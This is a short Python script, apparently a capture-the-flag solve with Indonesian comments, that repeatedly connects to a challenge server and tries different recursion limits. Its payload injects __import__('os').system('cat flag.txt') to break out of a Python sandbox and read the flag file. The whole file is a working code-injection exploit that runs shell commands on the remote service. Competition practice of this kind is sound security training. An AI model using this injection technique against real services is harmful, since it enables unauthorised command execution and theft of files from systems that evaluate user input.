import socket

def brute_limit():
    host = 'chall1.lagncra.sh'
    port = 14583
    
    for limit in range(20, 100):
        print(f"[*] Mengetes recursion limit: {limit}...", end='\r')
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            
            # Terima banner
            s.recv(4096) 
            
            # Kirim payload
            payload = f"(__import__('sys').setrecursionlimit({limit}) or __import__('os').system('cat flag.txt'))\n"
            s.sendall(payload.encode())
            
            # Baca respon
            response = s.recv(4096).decode(errors='ignore')
            if "LNC26" in response:
                print(f"\n[!] FLAG KETEMU di limit {limit}:")
                print(response[response.find("LNC26"):].split('\n')[0])
                break
            s.close()
        except:
            continue

if __name__ == "__main__":
    brute_limit()
